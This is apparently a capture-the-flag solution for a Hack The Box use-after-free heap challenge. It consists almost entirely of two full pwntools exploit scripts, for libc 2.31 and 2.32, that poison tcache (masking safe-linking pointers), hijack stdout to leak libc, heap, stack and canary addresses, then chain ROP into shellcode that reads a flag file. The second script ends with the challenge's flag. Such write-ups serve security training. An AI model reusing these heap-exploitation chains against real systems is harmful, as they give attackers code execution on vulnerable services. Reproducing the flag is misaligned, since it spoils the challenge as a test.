## I first wrote exploit for libc 2.31 without checking that the libc is now 2.32 for ubuntu 20.10 :: ::::::
# Here's libc 2.31 version of exploit

```python3
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Utils
def alloc(size,data):
        io.sendlineafter("Choice: ","1")
        io.sendlineafter("Size: ",f"{size}")
        io.sendafter("Data: ",data)

def delete(idx):
        io.sendlineafter("Choice: ","2")
        io.sendlineafter("Index: ",f"{idx}")
        return  io.recvline().strip()

def edit(idx,data):
        io.sendlineafter("Choice: ","3")
        io.sendlineafter("Index: ",f"{idx}")
        io.sendafter("Data: ",data)

# libc 2.31
unsorted_bin_offset = 0x1ebbe0
_IO_2_1_stdout = 0x1ec6a0
environ = 0x1ef2e0

#Gadgets
L_syscall = 0x00097e29
L_pop_rdi = 0x0015cc5a
L_pop_rsi = 0x00156004
L_pop_rdx = 0x00162866 # pop rdx ; pop rbx ; ret
L_pop_rax = 0x00112cfb

#Exploit
if __name__=="__main__":
#       io = process("./UAF")
        io = remote("docker.hackthebox.eu",31780)

        alloc(0x18,"HK") #0
        alloc(0x400,"HK") #1
        alloc(0x18,"HK") #2
        alloc(0x18,"HK") #3
        delete(0)
        delete(3)
        edit(3,"\xb0") # uaf

        alloc(0x18,"HK") #0
        alloc(0x18,b"A"*0x8+p64(0x431)) #3

        delete(1)
        alloc(0x400,"HK") #1
        libc_leak = u64(delete(2).split(b": ")[1].strip().ljust(8,b"\0"))
        libc_base = libc_leak - unsorted_bin_offset
        print(f"Libc: {hex(libc_base)}")

        alloc(0x18,p64(libc_base+unsorted_bin_offset)*2) #2
        alloc(0x18,"HK") #4
        delete(1)
        alloc(0x400,"A"*0x10) #1
        heap_base = u64(delete(1).split(b": ")[1].replace(b"A",b"").ljust(8,b"\0")) - 0x2b0
        print(f"Heap: {hex(heap_base)}")

        for i in xrange(8): #1,5~11
        	alloc(0x18,"HK")
        for i in xrange(5,12): # Delete 5~11
          delete(i)
        delete(2)
        delete(0)
        delete(1)
        delete(4)

        for i in xrange(7): #0,1,2,4,5,6,7
          alloc(0x18,"\0"*8 + "HK"+str(i))
        alloc(0x18,p64(heap_base+0x800)) #8
        alloc(0x18,"HK") #9
        alloc(0x18,"HK") #10
        alloc(0x118,"HK") #11
        alloc(0x78,"HK") #12
        alloc(0x18,b"A"*0x8+p16(0x1a1)) #13
        alloc(0x78,"HK") #14
        delete(14)
        delete(12)
        delete(11)
        alloc(0x198,b"A"*0x118+p64(0x81)+p64(libc_base+_IO_2_1_stdout-0x10)) #11
        alloc(0x78,"HK") #12
        alloc(0x78,p64(0)*2+\
        	p64(0xfbad1800)+p64(0)*3+\
        	p64(libc_base+environ)+p64(libc_base+environ+0x20)*4)
        stack_leak = u64(io.recvn(8))
        print(f"Stack: {hex(stack_leak)}")

        delete(0)
        delete(1)
        alloc(0x78,"HK") #0
        delete(11)
        delete(0)
        delete(12)
        shellcode = asm(f"""
								xor rax,2
								mov rdi,{heap_base+0x930}
								mov rsi,0
								syscall
								mov rdi, rax
								mov rsi, {heap_base}
								mov rdx, 0x100
								mov rax, 0x4e
								syscall
								mov rdi, 1
								mov rax, 1
								syscall
				""",arch="amd64")
        alloc(0x198,shellcode.ljust(0x118,b"A")+p64(0x81)+p64(stack_leak-0x120)) #0
        alloc(0x78,"/home/ctf\0") #1
        L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base)+\
								p64(libc_base+L_pop_rsi)+p64(0x1000)+\
								p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
								p64(libc_base+L_pop_rax)+p64(0xa)+\
								p64(libc_base+L_syscall)+\
								p64(heap_base+0x810)
        alloc(0x78,L_ROP) #11

        io.interactive()
```

## Here's libc 2.32 version exploit

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Utils
def alloc(size,data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("Size: ",f"{size}")
	io.sendafter("Data: ",data)

def delete(idx):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("Index: ",f"{idx}")
	return	io.recvline().strip()

def edit(idx,data):
	io.sendlineafter("Choice: ","3")
	io.sendlineafter("Index: ",f"{idx}")
	io.sendafter("Data: ",data)

def mask(heap_base,target):
	return (heap_base >> 0xc) ^ target

# libc 2.32
small_bin_offset = 0x1e3f10
_IO_2_1_stdout_ = 0x1e46c0
environ = 0x1e7600

#Gadgets
L_pop_rdi = 0x00158d1d
L_pop_rsi = 0x001906fc
L_pop_rdx = 0x001597d6 # pop rdx ; pop rbx ; ret ;
L_pop_rax = 0x001170ba
L_syscall = 0x000920d9

#Exploit
if __name__=="__main__":
#	io = process("./UAF",env={"LD_PRELOAD":"./libc-2.32.so"})
	io = remote("docker.hackthebox.eu",31780)

	#Leak libc
	for i in xrange(7): #0~6
		alloc(0x318,"HK")
	alloc(0x318,"HK") #7
	alloc(0x18,"HK") #8
	for i in xrange(7): # delete 0~6
		delete(i)
	delete(7)
	alloc(0x218,"A"*0x8) #0
	libc_leak = u64(delete(0).split(b": ")[1].strip().replace(b"A",b"").ljust(8,b"\0"))
	libc_base = libc_leak - small_bin_offset
	print(hex(libc_base))
	
	#Leak heap
	for i in xrange(7): #0~6
		alloc(0xf8,"HK")
	alloc(0xf8,"HK") #7
	alloc(0x18,"HK") #9
	alloc(0xf8,"HK") #10
	alloc(0x18,"HK") #11
	for i in xrange(7):
		delete(i)
	delete(7)
	delete(10)
	for i in xrange(7): #0~6
		alloc(0xf8,"HK")
	alloc(0xd8,"A"*0x8) #7
	heap_base = u64(delete(7).split(b": ")[1].strip().replace(b"A",b"").ljust(8,b"\0")) - 0x22d0
	print(hex(heap_base))

	#clear everything
	for i in xrange(7): # delete 0~6
		delete(i)
	delete(9)
	delete(8)
	delete(11)

	#Trigger UAF
	alloc(0x68,"HK0") #0
	alloc(0x68,"HK1") #1
	for i in xrange(2,7): #2 ~ 6
		alloc(0x18,f"HK{i}")
	delete(1)
	delete(0)
	edit(0,p8(p64(mask(heap_base,heap_base+0x23b0)+2)[0])) #,
	alloc(0x68,"HK") #0
	alloc(0x68,b"A"*0x8+p8(0xd1)) #1
	alloc(0x88,"HK") #7
	alloc(0x88,"HK") #8
	delete(8)
	delete(7)
	delete(6)
	alloc(0xc8,b"A"*0x18+p64(0x21)+p64(0)*3+p64(0x91)+p64(mask(heap_base,libc_base+_IO_2_1_stdout_-0x10)+2)) #6
	alloc(0x88,"HK") #7
	alloc(0x88,p64(0)*2+p64(0xfbad1800)+p64(0)*3+p64(libc_base+environ)+p64(libc_base+environ+0x20)*4) #8
	stack_leak = u64(io.recvn(8))
	print(hex(stack_leak))

	delete(6)
	alloc(0xa8,"HK") #6
	alloc(0xc8,b"A"*0x18+p64(0xb1)) #9
	delete(6)
	delete(2)
	delete(9)
	alloc(0xc8,b"A"*0x18+p64(0x41)+p64(mask(heap_base,libc_base+_IO_2_1_stdout_-0x20)+2)) #2
	alloc(0xa8,b"HK") #6
	alloc(0xa8,p64(0)*4+p64(0xfbad1800)+p64(0)*3+p64(stack_leak-0x130)+p64(stack_leak)*4) #9
	stack_cookie = u64(io.recvn(8))
	print(hex(stack_cookie))
	delete(2)
	alloc(0x98,"HK") #2
	alloc(0xc8,b"A"*0x18+p64(0xa1)+p64(0)*3+p64(0x91)+p64(0)*15+p64(0x21)) #10
	delete(2)
	delete(6)
	delete(10)
	alloc(0xc8,b"/home/ctf/flag.txt\0".ljust(0x18,b"A")+p64(0xa1)+p64(mask(heap_base,stack_leak-0x128)+2)) #2
	shellcode = asm(f"""
		mov rax,2
		mov rdi, {heap_base+0x23c0}
		mov rsi,0
		syscall
		mov rdi,rax
		mov rsi,{heap_base}
		mov rdx,0x100
		mov rax,0
		syscall
		mov rdi,1
		mov rax,1
		syscall
	""",arch="amd64")
	alloc(0x98,shellcode) #6
#	pause()
	L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base)+\
		p64(libc_base+L_pop_rsi)+p64(0x3000)+\
		p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
		p64(libc_base+L_pop_rax)+p64(0xa)+\
		p64(libc_base+L_syscall)+\
		p64(heap_base+0x23e0)
	pause()
	alloc(0x98,b"A"*0x8+ L_ROP) #10
#	HTB{s4f3_l1nk1ng_b3c0m3s_uns4f3_5bf6ee5}
	io.interactive()
```

